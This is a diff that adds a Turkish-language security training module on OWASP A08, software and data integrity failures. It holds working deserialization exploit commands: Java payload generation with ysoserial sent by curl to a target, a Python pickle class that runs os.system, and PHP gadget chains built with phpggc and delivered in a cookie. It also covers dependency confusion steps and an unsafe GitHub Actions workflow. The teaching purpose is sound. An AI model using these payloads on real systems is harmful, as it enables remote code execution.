@@ -1,0 +1,80 @@
+{
+  "id": "integrity-failures",
+  "slug": "integrity-failures",
+  "title": "A08 — Software & Data Integrity Failures",
+  "subtitle": "Yazılım ve Veri Bütünlüğü Hataları",
+  "description": "İmzasız güncellemeler, güvensiz CI/CD pipeline, deserialization saldırıları, supply chain.",
+  "icon": "🔏",
+  "order": 8,
+  "tags": ["deserialization", "CI/CD poisoning", "supply chain", "unsigned updates", "pickle", "Java serialization"],
+  "modules": [
+    {
+      "id": "integrity-intro",
+      "title": "Bütünlük Hataları",
+      "description": "İmza kontrolü olmayan yazılım güncellemeleri ve CI/CD güvenliği",
+      "difficulty": "beginner",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Yazılım Bütünlüğü",
+          "content": "**Yazılım ve Veri Bütünlüğü Hataları:** Güncelleme, kritik veri veya CI/CD pipeline'ının bütünlüğünün doğrulanmaması.\n\n**Örnek Zafiyetler:**\n1. **İmzasız güncelleme:** Yazılım, indirilen güncellemenin gerçekten geliştiriciden geldiğini doğrulamıyor → MITM ile zararlı güncelleme\n\n2. **Güvensiz Deserialization:** Uygulama, güvenilmeyen veriden nesne oluşturuyor (Java, PHP, Python pickle) → RCE\n\n3. **CI/CD Pipeline Poisoning:** Build/deploy sürecine zararlı kod ekleme (SolarWinds 2020)\n\n4. **Güvensiz npm/pip paketleri:** Bağımlılık karışıklığı (dependency confusion)\n\n**Deserialization RCE Neden Bu Kadar Tehlikeli?**\n- Bazı diller (Java, PHP) serileştirilmiş veriyi işlerken nesne oluşturma hook'larını çalıştırır\n- Özel hazırlanmış payload → `readObject()` çalışınca komut yürütülür"
+        }
+      ]
+    },
+    {
+      "id": "deserialization",
+      "title": "Güvensiz Deserialization",
+      "description": "Java, PHP ve Python pickle deserialization saldırıları",
+      "difficulty": "advanced",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Deserialization Saldırıları",
+          "commands": [
+            {
+              "command": "# Java deserialization tespiti:\n# Base64'te AC ED 00 05 (Java seri. magic bytes) ara:\necho 'rO0AB...' | base64 -d | xxd | head\n# AC ED 00 05 → Java serialized object!\n\n# ysoserial ile payload üret:\njava -jar ysoserial.jar CommonsCollections1 'id' | base64\n\n# Payload gönder:\ncurl -X POST https://hedef.com/api/data \\\n  -H 'Content-Type: application/x-java-serialized-object' \\\n  --data-binary @payload.bin",
+              "description": "Java deserialization tespiti ve ysoserial exploit payload üretimi"
+            },
+            {
+              "command": "# Python pickle deserialization RCE:\n# Uygulama pickle.loads(user_input) yapıyorsa:\npython3 -c \"\nimport pickle, os, base64\n\nclass RCE:\n    def __reduce__(self):\n        return (os.system, ('id > /tmp/pwned',))\n\npayload = pickle.dumps(RCE())\nprint(base64.b64encode(payload).decode())\n\"\n# Üretilen base64'ü API'ye gönder → /tmp/pwned dosyasına 'id' çıktısı yazılır",
+              "description": "Python pickle RCE — __reduce__ metodu ile komut çalıştırma",
+              "tip": "Pickle hiçbir zaman güvenilmeyen veriden deserialize edilmemeli — JSON veya msgpack kullan"
+            },
+            {
+              "command": "# PHP deserialization (Magic Methods):\n# __wakeup() veya __destruct() kullanan sınıf varsa:\n\n# PHP gadget chain (phpggc ile):\nphpggc Laravel/RCE1 system 'id'\nphpggc Monolog/RCE1 system 'whoami' -b  # base64\n\n# Payload cookie'ye ekle:\ncurl -b \"data=BASE64_PAYLOAD\" https://hedef.com/\n\n# Detaylı PHP deserialization analizi:\n# https://github.com/ambionics/phpggc",
+              "description": "PHP deserialization ve phpggc ile gadget chain oluşturma"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cicd-security",
+      "title": "CI/CD Pipeline Güvenliği",
+      "description": "GitHub Actions, Jenkins zafiyetleri ve supply chain güvenliği",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "CI/CD Güvenlik Testleri",
+          "commands": [
+            {
+              "command": "# GitHub Actions secret sızdırma — yanlış yapılandırma:\n# Zararlı PR ile workflow tetikleme (pull_request_target güvensiz):\n\n# Güvensiz workflow (kötü örnek):\non:\n  pull_request_target:\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}  # TEHLIKE!\n      - run: ${{ github.event.pull_request.body }}         # TEHLIKE!\n\n# Fork'tan gelen PR içinde zararlı komutlar çalışabilir!",
+              "description": "GitHub Actions güvensiz yapılandırması — pull_request_target riski"
+            },
+            {
+              "command": "# Dependency confusion saldırısı:\n# Özel paket adını (sirket-internal-lib) npm/pypi'ye public olarak yükle\n# Yüksek versiyon numarası ver → pip/npm tercih eder!\n\n# Tespit — özel paketlerin public registryde var mı?\npip install --dry-run sirket-internal-lib 2>&1\nnpm info @sirket/internal-lib 2>&1\n\n# Koruma — scope kullan:\n# .npmrc:\n@sirket:registry=https://registry.sirket.com\n\n# pip — private index önce:\npip config set global.index-url https://pypi.sirket.com/\npip config set global.extra-index-url https://pypi.org/simple/",
+              "description": "Dependency confusion saldırısı tespiti ve önleme"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
